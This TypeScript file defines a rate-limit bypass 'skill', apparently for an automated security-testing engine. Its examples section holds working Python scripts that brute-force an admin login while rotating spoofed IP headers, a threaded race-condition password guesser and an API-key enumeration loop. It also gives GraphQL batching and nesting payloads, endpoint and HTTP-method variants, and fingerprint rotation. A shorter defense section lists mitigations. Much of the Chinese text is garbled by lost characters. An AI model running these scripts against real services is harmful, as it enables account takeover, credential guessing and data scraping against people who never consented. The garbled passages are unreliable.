/**
 * HOS-Sec-Engine V2 - Rate Limit Bypass Skills
 * 速率限制绕过技术专?Skill 集合
 */

import { AttackDefenseSkill, DEFAULT_SKILL_RUNTIME } from '../../../types/skill';

export const rateLimitBypassSkills: AttackDefenseSkill[] = [
    {
        metadata: {
            id: 'api-ratelimit-001',
            name: 'Rate Limit Bypass Techniques',
            category: 'api',
            subCategory: 'rate-limit',
            riskLevel: 'high',
            confidence: 0.89,
            updatedAt: '2026-06',
            author: 'HOS-Sec-Engine',
            tags: ['rate-limit', 'rate-limit-bypass', 'brute-force', 'ip-spoofing', 'x-forwarded-for', 'token-bucket', 'api-abuse', 'graphql-batching', 'enumeration'],
        },
        trigger: {
            scenarios: [
                '目标 API 对登录、注册、密码重置等接口实施了速率限制',
                'API 返回 429 Too Many Requests 响应',
                '响应头中包含速率限制信息：X-RateLimit-Limit、X-RateLimit-Remaining、Retry-After',
                '需要暴力破解密码、OTP、API key 或验证码',
                '需要大量爬?API 数据或枚举资',
                'GraphQL API 对查询深度或复杂度有限制',
                'API 对每?API key 或用户账户有调用次数限制',
                '分布式系统使?API Gateway 实施速率限制',
            ],
            keywords: [
                'rate limit',
                'rate limiting',
                'throttling',
                '429',
                'too many requests',
                'retry after',
                'rate limit bypass',
                'rate limit evasion',
                'brute force bypass',
                'ip rotation',
                'x-forwarded-for',
                'user-agent rotation',
                'token bucket',
                'sliding window',
                'api abuse',
                'rate limiting bypass',
                '速率限制',
                '限速绕',
                '暴力破解绕过',
                'graphql batching',
                '批量请求',
            ],
            aliases: [
                'rate limit bypass',
                'throttle evasion',
                'brute force rate limit bypass',
                'ip spoofing',
                'header injection',
                'rate limit evasion',
                '限速绕',
                '频率限制绕过',
                '429 bypass',
                'anti-bruteforce bypass',
            ],
            indicators: [
                '429',
                'too many requests',
                'rate limit exceeded',
                'retry-after',
                'x-ratelimit-limit',
                'x-ratelimit-remaining',
                'x-ratelimit-reset',
                'blocked',
                'throttled',
                'slow down',
            ],
        },
        knowledge: {
            description: '速率限制 (Rate Limiting) 绕过技术用于规?API 对请求频率、数量或带宽的限制，使攻击者能够在受限条件下执行大量请求。速率限制通常基于 IP 地址、用户账户、API key 或会话实施。绕过技术包?IP 轮换、请求头伪造、端点变异、时序攻击、并行请求和协议层绕过。成功绕过速率限制可导致暴力破解成功、数据大规模爬取、拒绝服务和 API 滥用。速率限制的实现质量差异很大，很多系统存在可被利用的盲区',
            symptoms: [
                '发送多个请求后收到 429 Too Many Requests 响应',
                '响应头显?X-RateLimit-Remaining: 0 ?Retry-After: 60',
                '登录接口?N 次失败后锁定账户或要求验证码',
                'API key 达到每日调用上限后被拒绝',
                'GraphQL 查询因复杂度过高被拒',
                'IP 地址被列入临时黑名单',
                '请求被延迟响应（throttling?',
            ],
            rootCauses: [
                '速率限制仅基?IP 地址，可通过代理?X-Forwarded-For 绕过',
                '速率限制未考虑 IPv6 地址空间，可使用不同 IPv6 地址绕过',
                'API Gateway 和后端服务的速率限制不一致，可通过直接访问后端绕过',
                '速率限制计数器在分布式系统中未正确同步，可跨节点规避',
                '速率限制基于客户端可伪造的 HTTP 头（X-Forwarded-For、X-Real-IP',
                '速率限制仅应用于特定端点，其他端点或 HTTP 方法未被限制',
                'GraphQL batching/nesting 未计入速率限制',
                '速率限制时间窗口实现有缺陷（如固定窗口而非滑动窗口',
                '速率限制?CDN/WAF 层实施，源站未实施，可绕?CDN 直接访问',
            ],
            observations: [
                '超过 50% ?Web 应用速率限制实现存在可绕过的问题',
                'X-Forwarded-For 伪造是最常见且最有效的绕过方式之一',
                '很多系统只限?POST 请求（如登录），?GET 请求（如枚举）未限制',
                'GraphQL 的嵌套查询和批量查询可以绕过基于请求数的速率限制',
                '移动应用 API 的速率限制通常较弱，因为假设请求来自真实客户端',
                'CDN 层（Cloudflare、Akamai）的速率限制规则通常可被绕过',
                'API 版本切换?api/v1/ ?/api/v2/）有时可绕过旧版本的速率限制',
                'WebSocket 连接建立后通常不受 HTTP 速率限制约束',
            ],
            commonMistakes: [
                '仅基?IP 地址做速率限制，忽视代理、NAT ?IPv6 的影',
                '使用客户端可控的 HTTP 头（X-Forwarded-For）作为速率限制依据',
                '固定窗口算法在窗口边界可加倍请求（第一个窗口末 + 第二个窗口初',
                '速率限制计数器不持久化，服务重启后清',
                '只限制请求频率，不限制带宽或数据',
                '速率限制错误时返回详细错误信息（泄露实现细节',
                'GraphQL 查询深度/复杂度未计入速率限制',
                '只限制认证端点，忽略匿名端点的数据爬',
                '未区分正常用户和恶意请求的行为模?',
            ],
            notes: [
                '速率限制绕过是暴力破解、数据爬取和 API 滥用的前提技',
                'OWASP API Security Top 10 将速率限制缺失列为 API4:2023',
                '现代速率限制实现推荐使用滑动窗口 + 令牌?+ 行为分析的组',
                'Cloudflare、AWS WAF 等提供托管速率限制服务，但配置不当仍可绕过',
                '分布式系统中的速率限制需要全局计数器（?Redis），本地计数器无?',
            ],
        },
        action: {
            checklist: [
                '确定速率限制的实施层（CDN/WAF、API Gateway、应用层、数据库层）',
                '识别速率限制的维度（IP、用户、API key、会话、设备指纹）',
                '尝试修改 X-Forwarded-For、X-Real-IP、X-Client-IP 等请求头',
                '测试不同 HTTP 方法（GET/POST/PUT/PATCH/DELETE）是否有独立的速率限制',
                '测试不同 API 版本?v1/?v2/?v3/）是否共享速率限制计数',
                '测试不同端点变体?api/login?api/auth/login?auth/signin',
                '尝试 IPv6 地址轮换或代理池轮换',
                '测试并行请求（Race Condition）是否在计数器更新前完成',
                '测试 GraphQL batching/nesting 是否绕过速率限制',
                '测试时间窗口边界（滑动窗?vs 固定窗口',
                '检查速率限制响应头，分析限制规则',
                '尝试 API key 轮换或枚举未使用?API key',
            ],
            techniques: [
                'X-Forwarded-For 伪造：添加或修?X-Forwarded-For 请求头伪造不?IP',
                'IP 轮换：使用代理池、Tor 网络、云服务实例轮换?IP',
                'HTTP 方法变异：使用不?HTTP 方法访问同一资源',
                '端点枚举：利?API 端点变体绕过特定端点的速率限制',
                '并行请求竞赛：在速率限制计数器更新前发送多个请',
                'GraphQL batching：在单个请求中包含多个查?变更',
                'GraphQL nesting：嵌套查询绕过基于请求数的限',
                '时序攻击：利用固定窗口算法在窗口边界加倍请',
                'API key 枚举：尝试多?API key 分担速率限制',
                'User-Agent 轮换：使用不?User-Agent 绕过基于 UA 的速率限制',
                'Cookie/Session 轮换：使用不同会话绕过基于会话的速率限制',
                '协议切换：HTTP ?WebSocket ?gRPC 绕过 HTTP 层速率限制',
            ],
            examples: [
                {
                    name: 'X-Forwarded-For 头伪造绕?IP 速率限制',
                    description: '通过伪?X-Forwarded-For 请求头欺骗服务端使用不同?IP 进行速率限制计数',
                    content: `正常请求 (触发速率限制):
POST /api/v1/auth/login
Content-Type: application/json
{"username": "admin", "password": "password123"}

响应: 429 Too Many Requests

攻击 - 伪?X-Forwarded-For:
POST /api/v1/auth/login
Content-Type: application/json
X-Forwarded-For: 1.2.3.4
{"username": "admin", "password": "password123"}

响应: 401 Unauthorized (速率限制绕过成功)

自动化脚?(Python):
import requests
import random

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

headers = {
    'Content-Type': 'application/json',
    'X-Forwarded-For': random_ip(),
    'X-Real-IP': random_ip(),
    'X-Client-IP': random_ip(),
    'CF-Connecting-IP': random_ip(),
    'True-Client-IP': random_ip(),
}

for i in range(1000):
    headers['X-Forwarded-For'] = random_ip()
    r = requests.post("https://target.com/api/v1/auth/login",
        headers=headers,
        json={"username": "admin", "password": f"password{i:04d}"})
    if r.status_code != 429:
        print(f"Request {i}: {r.status_code}")
    if r.status_code == 200:
        print(f"SUCCESS! Password found: password{i:04d}")
        break

常见可伪造的 IP ?
  - X-Forwarded-For (最通用)
  - X-Real-IP (Nginx)
  - X-Client-IP (通用)
  - CF-Connecting-IP (Cloudflare)
  - True-Client-IP (Akamai/Fastly)
  - X-Cluster-Client-IP (Rackspace)
  - Forwarded (RFC 7239 标准)

原理: 很多应用使用这些请求头获取客户端真实 IP（在代理/负载均衡后面?     如果速率限制基于这些头中?IP 值，攻击者可任意伪造绕过`,
                },
                {
                    name: 'HTTP 方法变异绕过速率限制',
                    description: '不同 HTTP 方法可能有独立的速率限制计数器，通过切换方法绕过限制',
                    content: `场景: 登录接口 POST 方法被速率限制

POST /api/v1/auth/login  (429 Too Many Requests)

尝试其他 HTTP 方法:
GET /api/v1/auth/login?username=admin&password=password123
?可能绕过，因?GET ?POST 使用不同的速率限制规则

PUT /api/v1/auth/login
{"username": "admin", "password": "password123"}
?可能绕过

PATCH /api/v1/auth/login
{"username": "admin", "password": "password123"}
?可能绕过

HEAD /api/v1/auth/login
?HEAD 通常不限制（因为无响应体?
OPTIONS /api/v1/auth/login
?OPTIONS 通常用于 CORS 预检，不限制

自定义方?
PROPFIND /api/v1/auth/login
?某些后端框架（如 Spring）将未知方法当作 POST 处理

大小写变?
post /api/v1/auth/login  (小写)
?某些后端解析器可能区分大小写

原理: 速率限制通常?HTTP 方法分别配置
     如果只限制了 POST，其他方法可能不受限
     某些后端框架对非标准方法的处理可能导致绕过`,
                },
                {
                    name: '端点枚举与变体绕',
                    description: '同一功能可能有多?API 端点，速率限制可能只应用于部分端点',
                    content: `场景: 密码重置接口被速率限制

受限端点:
POST /api/v1/auth/forgot-password  (429 Too Many Requests)

尝试端点变体:
POST /api/v1/auth/reset-password
POST /api/v1/auth/password-reset
POST /api/v1/auth/recover-password
POST /api/v2/auth/forgot-password
POST /api/auth/forgot-password
POST /api/v1/user/forgot-password
POST /api/v1/account/forgot-password
POST /api/v1/users/forgot-password
POST /api/v1/password/forgot
POST /api/v1/auth/forgotPassword
POST /api/v1/auth/send-reset-email

移动端专用端?
POST /api/v1/mobile/auth/forgot-password
POST /api/v1/app/auth/forgot-password

GraphQL 替代:
POST /graphql
{"query": "mutation { forgotPassword(email: \\"admin@example.com\\") { success } }"}

自动化端点发?
1. ?JavaScript 源代码中提取 API 端点
2. 从移动应?APK/IPA 中提?API 端点
3. 使用 API 文档 (Swagger/OpenAPI) 发现端点
4. 基于命名模式生成端点变体
5. 检?API 版本历史 (/v1/ ?/v2/ ?/v3/)

原理: 微服务和 API 版本迭代中，同一功能可能有多个实?     速率限制配置可能遗漏部分端点或版本`,
                },
                {
                    name: '并行请求竞赛 (Race Condition)',
                    description: '在速率限制计数器更新前并发发送多个请求，利用时序竞争绕过限制',
                    content: `场景: 登录接口限制每分?5 次请?
正常串行请求:
请求1 ?检查计?0<5) ?允许 ?计数+1 ?处理
请求2 ?检查计?1<5) ?允许 ?计数+1 ?处理
请求3 ?检查计?2<5) ?允许 ?计数+1 ?处理
请求4 ?检查计?3<5) ?允许 ?计数+1 ?处理
请求5 ?检查计?4<5) ?允许 ?计数+1 ?处理
请求6 ?检查计?5>=5) ?拒绝 ?429

Race Condition 攻击:
同时发?20 个请求（多线?异步?
请求1 ?检查计?0<5) ?允许
请求2 ?检查计?0<5) ?允许  // 计数尚未更新
请求3 ?检查计?0<5) ?允许  // 计数尚未更新
...
请求20 ?检查计?0<5) ?允许  // 计数尚未更新

Python 实现:
import requests
import concurrent.futures

def send_request(password):
    return requests.post("https://target.com/api/v1/auth/login",
        json={"username": "admin", "password": password})

passwords = [f"password{i:04d}" for i in range(100)]
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = {executor.submit(send_request, pw): pw for pw in passwords}
    for future in concurrent.futures.as_completed(futures):
        pw = futures[future]
        r = future.result()
        if r.status_code == 200:
            print(f"SUCCESS! Password: {pw}")
            break

原理: 如果速率限制使用非原子操作（check-then-act），
     并发请求可能在计数更新前都通过检?     特别是在无锁实现或分布式系统中更常见

适用: 非原子速率限制计数器、无分布式锁的实现`,
                },
                {
                    name: 'GraphQL Batching 绕过速率限制',
                    description: '在单?GraphQL 请求中包含多个查?变更，绕过基于请求数的速率限制',
                    content: `场景: GraphQL API 限制每分?10 个请?
正常请求:
POST /graphql
{"query": "{ user(id: \\"1\\") { name email } }"}
?1 个请?= 1 次计?
攻击 1 - Query Batching:
POST /graphql
[
  {"query": "{ user(id: \\"1\\") { name email } }"},
  {"query": "{ user(id: \\"2\\") { name email } }"},
  {"query": "{ user(id: \\"3\\") { name email } }"},
  {"query": "{ user(id: \\"4\\") { name email } }"},
  {"query": "{ user(id: \\"5\\") { name email } }"},
  {"query": "{ user(id: \\"6\\") { name email } }"},
  {"query": "{ user(id: \\"7\\") { name email } }"},
  {"query": "{ user(id: \\"8\\") { name email } }"},
  {"query": "{ user(id: \\"9\\") { name email } }"},
  {"query": "{ user(id: \\"10\\") { name email } }"}
]
?1 ?HTTP 请求 = 10 个查??如果速率限制?HTTP 请求计数，实际执行了 10 倍查?
攻击 2 - 嵌套查询 (N+1):
POST /graphql
{
  "query": "{
    users(first: 100) {
      edges {
        node {
          id
          name
          email
          posts(first: 50) {
            edges {
              node {
                id
                title
                comments(first: 20) {
                  edges {
                    node {
                      id
                      text
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }"
}
?1 个请求可获取 100 × 50 × 20 = 100,000 条数??如果速率限制按请求数而非数据量，此查询极高效

攻击 3 - 别名批量查询:
POST /graphql
{
  "query": "{
    u1: user(id: \\"1\\") { name email }
    u2: user(id: \\"2\\") { name email }
    u3: user(id: \\"3\\") { name email }
    ... (up to 100)
  }"
}
?利用 GraphQL 别名在同一查询中获取多个对?
防御: 按查询复杂度（深度、字段数、解析成本）计数而非请求数`,
                },
                {
                    name: 'Token Bucket 时序攻击',
                    description: '利用令牌桶或固定窗口算法的时间特性，在特定时间点集中发送请',
                    content: `场景: 令牌桶算法，每秒添加 10 个令牌，桶容?10

固定窗口攻击:
假设窗口?1 分钟 (00:00-00:59, 01:00-01:59, ...)
?00:58 发?N 个请求（消耗第一个窗口的剩余配额??01:00 立即发?N 个请求（新窗口开始，完整配额???~2 秒内可发?2N 个请?
令牌桶边缘攻?
桶容?10，每秒填?1 个令?等待桶满 (10 ?
在极短时间内发?10 个请求（耗尽桶）
立即再发?10 个请求（桶已开始填充新令牌???~1 秒内发?10+ 个请?
滑动窗口 vs 固定窗口:
固定窗口: 每分?100 请求
  - 01:59 发?100 请求
  - 02:00 发?100 请求
  ?2 秒内 200 请求 (固定窗口缺陷)

滑动窗口: 过去 60 秒内 100 请求
  - 更平滑，但实现复杂度?  - 部分实现使用近似滑动窗口，仍有边界问?
Python 时序攻击:
import requests
import time

# 等待窗口刷新
next_window = (int(time.time()) // 60 + 1) * 60
time.sleep(next_window - time.time())

# 窗口开始瞬间发送大量请?for i in range(100):
    requests.get("https://target.com/api/v1/users")

原理: 固定窗口在边界处允许 2 倍于限制流量的突?     利用这个时序特性可在短时间内发送超额请求`,
                },
                {
                    name: 'API Key 枚举与轮',
                    description: '通过枚举或轮?API key 分散速率限制，每?key 使用其独立配',
                    content: `场景: 每个 API key 限制 1000 ??
攻击 1 - API Key 枚举:
尝试常见 API key 模式:
sk-1, sk-2, sk-3, ... sk-1000
key_0001, key_0002, ..., key_9999
api_key_1, api_key_2, ..., api_key_N

Python:
import requests

for i in range(1, 10000):
    api_key = f"sk-{i:04d}"
    headers = {"Authorization": f"Bearer {api_key}"}
    r = requests.get("https://target.com/api/v1/users", headers=headers)
    if r.status_code == 200:
        print(f"Valid API key: {api_key}")
    elif r.status_code == 429:
        print(f"Rate limited for key {api_key}, switching...")
        continue

攻击 2 - 免费账户轮换:
批量注册免费账户获取 API key
每个账户?key 有独立速率限制
轮换使用不同账户?key

攻击 3 - 多租?key 利用:
如果系统使用共享速率限制?尝试不同租户/组织?API key
每个租户可能有独立配?
攻击 4 - 默认 API key:
尝试常见默认 key:
test, demo, admin, root, default, api
sk_test_xxxx (Stripe 测试 key)
pk_live_xxxx (Stripe 生产 key)

防御: API key 绑定到账户，全局速率限制，而非?key 独立限制`,
                },
                {
                    name: 'User-Agent 与指纹轮',
                    description: '通过轮换 User-Agent 和其他指纹信息绕过基于客户端标识的速率限制',
                    content: `场景: 速率限制基于 User-Agent 或设备指?
User-Agent 轮换列表:
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15
Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15
PostmanRuntime/7.35.0
python-requests/2.31.0

完整指纹轮换:
headers = {
    'User-Agent': random_user_agent(),
    'Accept': random_accept(),
    'Accept-Language': random_language(),
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
}

Cookie 轮换:
session_id=random_uuid()
csrf_token=random_uuid()
device_id=random_uuid()

TLS 指纹轮换 (JA3):
使用不同 TLS 库或配置改变 TLS 指纹
curl, requests, httpx, aiohttp 有不?JA3 指纹

原理: 一些速率限制系统使用多维度指纹（UA + Cookie + TLS?     如果其中一个维度可伪造，可绕过基于该维度的限制`,
                },
            ],
        },
        validation: {
            indicators: [
                '修改 X-Forwarded-For ?429 响应变为 200/401',
                '切换 HTTP 方法后速率限制不再触发',
                '访问端点变体时速率限制计数器独',
                '并行请求中多个请求在限制触发前成功执',
                'GraphQL batching 请求返回大量数据但未触发速率限制',
                '使用不同 API key 时速率限制计数器重',
                '时间窗口边界处可发送超额请?',
            ],
            successSigns: [
                '429 响应消失，请求正常处',
                '暴力破解成功（找到正确密?OTP/API key',
                '大量数据爬取未被阻止',
                '速率限制响应头显示剩余配额重',
                '并行请求的成功率显著高于串行请求',
            ],
            falsePositiveSigns: [
                '429 仍然返回，说明伪造无效或速率限制在更底层实施',
                '响应 200 但数据是缓存而非实时查询',
                '不同端点共享同一个速率限制计数',
                '并行请求被排队处理而非并发执行',
                'API key 无效返回 401 而非速率限制相关错误',
                'GraphQL batching 被服务端解析为单个查询计?',
            ],
        },
        defense: {
            recommendations: [
                '实施多层速率限制：CDN/WAF ?+ API Gateway ?+ 应用',
                '速率限制基于不可伪造的标识：TCP 连接 IP（而非 X-Forwarded-For）、用户账户、API key',
                '如果必须使用 X-Forwarded-For，只信任已知代理服务器设置的',
                '使用滑动窗口算法而非固定窗口，避免边界突发问',
                '速率限制计数器使用原子操作（Redis INCR、分布式锁）',
                'GraphQL 实施查询复杂度限制（深度、字段数、解析成本），而非简单请求计',
                '所?API 端点（包括所有版本和变体）共享同一个速率限制策略',
                '实施渐进式速率限制：警??降??限制 ?临时封禁',
                '使用行为分析检测异常模式（固定间隔请求、超高频率等',
                '对敏感操作（登录、密码重置、支付）实施更严格的速率限制',
                '速率限制响应使用标准 429 状态码?Retry-After ',
                '不在速率限制响应中泄露实现细节（如计数器值、窗口大小）',
            ],
            mitigations: [
                '使用托管速率限制服务（Cloudflare Rate Limiting、AWS WAF Rate-Based Rules',
                '实施 CAPTCHA ?Proof-of-Work 作为速率限制后的二次验证',
                '监控和告警异常速率模式，及时发现和响应滥用',
                '定期审查和更新速率限制策略，覆盖新增端',
                '?API key 实施轮换和生命周期管理，及时撤销泄露 key',
                '使用 IP 信誉服务识别和阻止已知恶?IP',
                '实施 API 使用配额和计费，经济上增加滥用成?',
            ],
            references: [
                'https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/',
                'https://portswigger.net/web-security/rate-limiting',
                'https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html',
                'https://cloud.google.com/architecture/rate-limiting-strategies-techniques',
                'https://blog.cloudflare.com/counting-things-a-lot-of-different-things/',
                'https://graphql.org/learn/best-practices/#pagination',
            ],
        },
        quality: {
            confidence: 0.89,
            reviewed: true,
            tested: true,
            lastVerified: '2026-06',
        },
        playbooks: ['api-security-review'],
        phase: 'rate-limit-testing',
        enabled: true,
        runtime: {
            requiresAgent: false,
            agentCount: 1,
            parallelizable: true,
            requiresNetwork: true,
            requiresSandbox: false,
            dependencies: [],
            estimatedTokens: 3000,
        },
    },
];
